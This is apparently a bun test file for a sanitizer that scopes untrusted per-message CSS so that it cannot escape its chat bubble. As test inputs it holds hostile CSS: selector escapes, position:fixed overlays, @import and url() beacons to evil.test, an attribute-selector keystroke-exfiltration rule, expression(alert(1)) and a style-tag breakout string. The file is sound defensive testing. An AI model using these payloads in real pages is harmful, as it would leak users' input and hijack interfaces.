/**
 * Message stylesheets, attacked and used. A `<style>` in a message is author CSS from an untrusted card:
 * every selector must start at THIS mount's root (a body, `*`, sibling or `.host-protected` rule cannot reach
 * the app, the composer or another message), nothing may load or leave the bubble, and the CSS-only tab and
 * flip cards RoleCall renders must keep working. The scoped output is re-parsed and asserted structurally,
 * because jsdom's cascade is not a trustworthy judge of selectors.
 */
import { expect, test } from "bun:test";
import { parseSheet, type Parsed } from "../../../extensions/theme-css";
import { tokenizeCss } from "../../../extensions/theme-css-tokens";
import { MAX_MESSAGE_CSS_CHARS, scopeMessageCss } from "./message-css";

const PREFIX = ".msg-t1.msg-t1.msg-t1";
const scope = (css: string): string => scopeMessageCss(css, "t1");

/** Every selector of every style rule in scoped output, split at top-level commas. */
function selectors(out: string): string[] {
  const found: string[] = [];
  const walk = (rules: Parsed[]): void => {
    for (const r of rules) {
      if (r.kind === "rules") walk(r.body);
      else if (r.kind === "style") {
        const text = out.slice(r.prelude[0]!.start, r.prelude[r.prelude.length - 1]!.end);
        let depth = 0, from = 0;
        for (let i = 0; i <= text.length; i++) {
          const ch = text[i];
          if (ch === "(" || ch === "[") depth++;
          else if (ch === ")" || ch === "]") depth--;
          else if ((ch === "," && depth === 0) || i === text.length) { found.push(text.slice(from, i).trim()); from = i + 1; }
        }
      }
    }
  };
  walk(parseSheet(tokenizeCss(out)));
  return found;
}

const allScoped = (out: string): boolean => selectors(out).every((s) => s === PREFIX || s.startsWith(`${PREFIX} `) || s.startsWith(`${PREFIX}:`) || s.startsWith(`${PREFIX}.`) || s.startsWith(`${PREFIX}[`));

// ---- selector escape ----

test.each([
  "body{color:red}",
  "html{color:red}",
  ":root{color:red}",
  "*{color:red}",
  "html body *{color:red}",
  ".host-protected{color:red}",
  ".acts,.scs,.blk+.blk{color:red}",
  "#composer{color:red}",
  "a:not(.x){color:red}",
  ":is(body,.a) p{color:red}",
  ".a:has(~ .host-protected){color:red}",
  "\\62 ody{color:red}",
  ".host\\2d protected{color:red}",
])("selector %s stays under this message's root", (css) => {
  const out = scope(css);
  expect(out).not.toBe("");
  expect(allScoped(out)).toBe(true);
});

test("a rule aimed at the app's own classes lands on message-namespaced names instead", () => {
  const out = scope(".host-protected, .acts, .scs{color:red} #composer{color:red}");
  expect(out).toContain(`${PREFIX} .custom-host-protected`);
  expect(out).toContain(`${PREFIX} .custom-acts`);
  expect(out).toContain(`${PREFIX} .custom-scs`);
  expect(out).toContain("#msg-t1-composer");
  expect(out).not.toMatch(/[^-](?:\.host-protected|\.acts|\.scs)\b|#composer/);
});

test("body, html and :root mean the message root, and a root rule may paint it but never move it", () => {
  const out = scope("body{position:fixed;inset:0;transform:translate(900px);width:100vw;margin:-99px;background:#123;color:#eee;z-index:9}");
  expect(selectors(out)).toContain(PREFIX);
  const rule = out.slice(out.lastIndexOf(`${PREFIX}{`));
  expect(rule).toContain("background:#123");
  expect(rule).toContain("color:#eee");
  expect(rule).not.toMatch(/position|inset|transform|width|margin|z-index/);
});

test.each([
  "body{box-shadow:0 0 0 4000px red}",
  ":root{outline:4000px solid red;outline-offset:50px}",
  "html{outline-width:4000px;outline-style:solid;border-image:linear-gradient(red,blue) 1}",
  "body:hover,body.x{box-shadow:0 0 99px 99px red}",
])("a root rule %s cannot paint past the bubble", (css) => {
  const out = scope(`${css} .child{box-shadow:0 0 9px red;outline:2px solid red}`);
  expect(out).not.toMatch(new RegExp(`${PREFIX.replaceAll(".", "\\.")}(?::hover)?\\{[^}]*(?:shadow|outline)`));
  expect(out).not.toMatch(/4000px|99px/);
  expect(out).toContain(".custom-child{box-shadow:0 0 9px red;outline:2px solid red}"); // a descendant may: the root clips it
});

test.each([
  "~ .x{color:red}",
  "+ .x{color:red}",
  "> .x{color:red}",
  ":host{color:red}",
  ":host-context(body){color:red}",
  "::slotted(p){color:red}",
  "div::part(x){color:red}",
  "& .x{color:red}",
  "[class*=host]{color:red}",
  "[class^=host]{color:red}",
  "ns|a{color:red}",
])("selector %s is refused whole", (css) => {
  expect(scope(`${css} .keep{color:blue}`)).not.toMatch(/red/);
  expect(scope(`${css} .keep{color:blue}`)).toContain("blue");
});

test("a mid-list bad selector drops its rule, not just its part", () => {
  expect(scope(".a, ~ .b, .c{color:red}")).toBe("");
});

test("class attribute selectors follow the custom- rename; id, for and name follow the per-message names", () => {
  const out = scope('[class~="card"]{color:red} [class="a b"]{color:red} input[name="grp"]{color:red} label[for="t1"]{color:red} [id="x"]{color:red}');
  expect(out).toContain('[class~="custom-card"]');
  expect(out).toContain('[class="custom-a custom-b"]');
  expect(out).toContain('[name="msg-t1-grp"]');
  expect(out).toContain('[for="msg-t1-t1"]');
  expect(out).toContain('[id="msg-t1-x"]');
  expect(scope('[for^="t"]{color:red}')).toBe("");
});

test("two mounts of one message share no selector, id or keyframe", () => {
  const css = "#a:checked ~ .p{color:red} @keyframes k{from{opacity:0}to{opacity:1}} .p{animation:k 1s}";
  const one = scopeMessageCss(css, "m1"), two = scopeMessageCss(css, "m2");
  expect(one).toContain("msg-m1");
  expect(one).not.toContain("msg-m2");
  expect(one.replaceAll("m1", "m2")).toBe(two);
});

// ---- overlay, import, egress ----

test("position:fixed becomes absolute inside a root that clips its own paint", () => {
  const out = scope(".veil{position:fixed;inset:0;width:100%;height:100%;background:red;z-index:99999}");
  expect(out).not.toContain("fixed");
  expect(out).toContain("position:absolute");
  expect(out.startsWith(`${PREFIX}{position:relative;isolation:isolate;contain:paint}`)).toBe(true);
});

test.each([
  ".a{position:sticky-ish}",
  ".a{position:fixed absolute}",
  ".a{display:grid-lanes}",
])("an odd position or display value %s is dropped", (css) => {
  expect(scope(`${css} .b{color:red}`)).not.toMatch(/sticky-ish|grid-lanes|fixed/);
});

test("@import, @font-face, @layer and unknown at-rules are dropped and the rest of the sheet is kept", () => {
  const out = scope(
    '@charset "utf-8"; @import url("https://evil.test/x.css"); @import "https://fonts.googleapis.com/css2?family=Fredoka"; @layer base, theme; @namespace svg url(http://x);' +
      "@font-face{font-family:Cinzel;src:url(https://evil.test/f.woff2)} @layer x{.a{color:red}} @page{margin:0} @property --x{syntax:'*';inherits:false} @document x{.a{color:red}}" +
      ".keep{color:blue}",
  );
  expect(out).not.toMatch(/@import|@font-face|@layer|@page|@property|@namespace|@charset|@document|evil|googleapis|red/);
  expect(out).toContain("color:blue");
});

test.each([
  "background:url(https://evil.test/leak.png)",
  'background:url("https://evil.test/leak.png")',
  "background-image:url(data:image/png;base64,iVBORw0KGgo=)",
  "background:\\75 rl(https://evil.test/x)",
  "background:ur\\6c (https://evil.test/x)",
  'background-image:image-set("https://evil.test/x.png" 1x)',
  'background-image:-webkit-image-set(url(https://evil.test/x.png) 1x)',
  "background:cross-fade(url(x) 50%, red)",
  "content:attr(data-x)",
  "content:url(https://evil.test/x.png)",
  "cursor:url(https://evil.test/c.png),auto",
  "filter:url(#x)",
  "clip-path:url(#x)",
  "list-style-image:url(https://evil.test/x.png)",
  "color:expression(alert(1))",
  "behavior:url(x.htc)",
  "-moz-binding:url(x)",
  "width:100vw",
  "height:100dvh",
  "min-height:50svh",
  "width:10cqw",
])("declaration %s is dropped", (decl) => {
  const out = scope(`.a{${decl};color:red}`);
  expect(out).toContain("color:red");
  expect(out).not.toMatch(/url|image-set|cross-fade|attr\(|expression|behavior|binding|\bvw|\bvh|dvh|svh|cqw|evil|data:/i);
});

test("an attribute-selector exfiltration rule has nothing to fetch with", () => {
  const out = scope('input[value^="a"]{background:url(https://evil.test/leak?a)} input[type="radio"]{margin:0}');
  expect(out).not.toMatch(/url|evil/);
  expect(out).toContain('input[type="radio"]');
});

test("a closing style tag inside a CSS string stays an inert string", () => {
  const out = scope('.a::after{content:"</style><script>alert(1)</script>"}');
  expect(out).toContain('content:"</style><script>alert(1)</script>"');
});

// ---- animation ----

test("animation may only name keyframes the message itself defines, and they are renamed per mount", () => {
  const out = scope("@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}} .a{animation:spin 1s linear infinite} .b{animation-name:spin} @-webkit-keyframes drift{0%{opacity:0}100%{opacity:1}} .c{-webkit-animation:drift 2s}");
  expect(out).toContain("@keyframes msg-t1-kf-spin{");
  expect(out).toContain("animation:msg-t1-kf-spin 1s linear infinite");
  expect(out).toContain("animation-name:msg-t1-kf-spin");
  expect(out).toContain("@keyframes msg-t1-kf-drift{");
  expect(out).not.toMatch(/animation:spin|@keyframes spin|@keyframes drift/);
});

test.each([
  ".a{animation:pulse 1s infinite}",
  ".a{animation:premierefloorfog 1s}",
  ".a{animation-name:pulse}",
  ".a{animation:var(--anim)}",
  '.a{animation-name:"pulse"}',
])("%s cannot start a host keyframe", (rule) => {
  const out = scope(`${rule} .b{color:red}`);
  expect(out).not.toMatch(/pulse|premierefloorfog|animation/);
  expect(out).toContain("color:red");
});

test("a message that redefines a host keyframe name only defines its own renamed copy", () => {
  const out = scope("@keyframes pulse{from{opacity:0}to{opacity:1}} .a{animation:pulse 1s}");
  expect(out).toContain("@keyframes msg-t1-kf-pulse{");
  expect(out).not.toMatch(/@keyframes pulse|animation:pulse/);
});

// ---- size and shape ----

test("a stylesheet over the character cap is dropped whole", () => {
  expect(scope(`.a{color:red}${" ".repeat(MAX_MESSAGE_CSS_CHARS)}`)).toBe("");
});

test("a stylesheet of too many tokens is dropped whole, within the character cap", () => {
  const css = ".a{color:red}".repeat(4900);
  expect(css.length).toBeLessThan(MAX_MESSAGE_CSS_CHARS);
  expect(scope(css)).toBe("");
  expect(scope(css.slice(0, 13 * 1000))).not.toBe("");
});

test.each([
  ".a{color:red",
  ".a{color:red}}",
  ".a{color:red} /* never closes",
  ".a{content:'newline\n'}",
  ".a{background:url(bad url)}",
  ".a{color:red}<!-- x",
  "@media a{@media b{@media c{@media d{.a{color:red}}}}}",
  ".a\0{color:red}",
])("broken CSS %j drops the whole sheet", (css) => {
  expect(scope(css)).toBe("");
});

test("a rule that nests is dropped and its neighbours survive", () => {
  const out = scope(".a{color:red; .b{color:green}} .c{color:blue}");
  expect(out).not.toMatch(/red|green/);
  expect(out).toContain("color:blue");
});

test("property and value text does not leak a bang, a comment or an uppercase vendor prefix", () => {
  const out = scope(".a{COLOR:red !important;-WEBKIT-Transition:all 1s;--Brand:#fff;background:var(--Brand)}");
  expect(out).toContain("color:red;");
  expect(out).toContain("-webkit-transition:all 1s");
  expect(out).toContain("--Brand:#fff");
  expect(out).toContain("background:var(--Brand)");
  expect(out).not.toContain("important");
});

test("an unknown or blocked property is dropped alone", () => {
  const out = scope(".a{color:red;will-change:transform;contain:none;all:unset;mask-image:linear-gradient(red,blue);font-size:12px}");
  expect(out).toContain("color:red");
  expect(out).toContain("font-size:12px");
  expect(out).not.toMatch(/will-change|contain:none|all:|mask/);
});

// ---- the cards RoleCall renders ----

/** RoleCall's tab card (creator-card-id-scoping.test.ts:18-30). */
const TAB_CSS = `
#tab-a:checked ~ .panels .pane-a { display: block; }
#tab-b:checked ~ .panels .pane-b { display: block; }
input[name="obsgrp"] { position: absolute; opacity: 0; }
label[for="tab-a"] { color: red; cursor: pointer; }
.pane-a, .pane-b { display: none; }
`;

test("the radio-tab card's selectors keep matching its renamed ids, names and classes", () => {
  const out = scope(TAB_CSS);
  expect(allScoped(out)).toBe(true);
  expect(out).toContain(`${PREFIX} #msg-t1-tab-a:checked ~ .custom-panels .custom-pane-a{display:block}`);
  expect(out).toContain(`${PREFIX} input[name="msg-t1-obsgrp"]{position:absolute;opacity:0}`);
  expect(out).toContain(`${PREFIX} label[for="msg-t1-tab-a"]{color:red;cursor:pointer}`);
  expect(out).toContain(`${PREFIX} .custom-pane-a,${PREFIX} .custom-pane-b{display:none}`);
});

test("a flip card keeps the 3D motion it needs", () => {
  const out = scope(`
.flip { perspective: 800px; width: 240px; height: 320px; }
.flip .inner { position: relative; width: 100%; height: 100%; transition: transform .6s; transform-style: preserve-3d; }
.flip input:checked ~ .inner, .flip:hover .inner { transform: rotateY(180deg); }
.front, .back { position: absolute; inset: 0; backface-visibility: hidden; -webkit-backface-visibility: hidden; }
.back { transform: rotateY(180deg); }`);
  for (const piece of ["perspective:800px", "transition:transform .6s", "transform-style:preserve-3d", "transform:rotateY(180deg)", "backface-visibility:hidden", "-webkit-backface-visibility:hidden", "inset:0", ":hover", "input:checked"]) {
    expect(out).toContain(piece);
  }
  expect(allScoped(out)).toBe(true);
});

test("a :target tab, gradient text, custom properties and a media query survive", () => {
  const out = scope(`
.tab { display: none; } .tab:target { display: block; }
.title { background: linear-gradient(90deg, #f0c, #0cf); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.card { --accent: #daa520; border: 1px solid var(--accent); }
@media (max-width: 400px) { .card { padding: 4px; } }`);
  expect(out).toContain(".custom-tab:target{display:block}");
  expect(out).toContain("-webkit-background-clip:text");
  expect(out).toContain("--accent:#daa520");
  expect(out).toContain("border:1px solid var(--accent)");
  expect(out).toContain(`@media (max-width: 400px){${PREFIX} .custom-card{padding:4px}}`);
});

test("an empty or declaration-less sheet scopes to nothing", () => {
  expect(scope("")).toBe("");
  expect(scope("/* only a comment */")).toBe("");
  expect(scope(".a{}")).toBe("");
  expect(scope(".a{will-change:transform}")).toBe("");
});
